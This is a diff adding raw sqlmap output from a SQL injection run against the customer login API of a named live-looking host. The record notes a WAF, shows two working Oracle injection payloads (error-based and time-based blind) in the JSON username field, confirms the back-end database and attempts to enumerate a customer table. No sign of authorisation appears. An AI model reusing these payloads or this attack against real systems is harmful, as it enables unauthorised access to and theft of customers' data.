@@ -1,0 +1,49 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.10#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:05:59 /2025-10-09/
+
+[09:05:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' from file '/tmp/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET https://customerconnect.ems.com.vn/api/User_Customer/Login
+POST data: {"Username":"*","Password":"test"}
+do you want to test this URL? [Y/n/q]
+> Y
+[09:05:59] [INFO] testing URL 'https://customerconnect.ems.com.vn/api/User_Customer/Login'
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[09:05:59] [INFO] using '/home/ubuntu/.local/share/sqlmap/output/results-10092025_0905am.csv' as the CSV results file in multiple targets mode
+[09:05:59] [INFO] testing connection to the target URL
+[09:06:00] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: error-based
+    Title: Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)
+    Payload: {"Username":"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'","Password":"test"}
+
+    Type: time-based blind
+    Title: Oracle AND time-based blind (heavy query)
+    Payload: {"Username":"'||(SELECT CHR(110)||CHR(122)||CHR(78)||CHR(119) FROM DUAL WHERE 1671=1671 AND 6340=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5))||'","Password":"test"}
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[09:06:00] [INFO] testing Oracle
+[09:06:00] [INFO] confirming Oracle
+[09:06:00] [INFO] the back-end DBMS is Oracle
+web server operating system: Windows
+web application technology: ASP.NET
+back-end DBMS: Oracle
+[09:06:00] [INFO] fetching columns for table 'USER_CUSTOMER' in database 'BCCPCOM'
+[09:06:00] [WARNING] unable to retrieve column names for table 'USER_CUSTOMER' in database 'BCCPCOM'
+do you want to use common column existence check? [y/N/q] N
+[09:06:00] [WARNING] unable to enumerate the columns for table 'USER_CUSTOMER' in database 'BCCPCOM'
+[09:06:00] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/ubuntu/.local/share/sqlmap/output/results-10092025_0905am.csv'
+
+[*] ending @ 09:06:00 /2025-10-09/
+
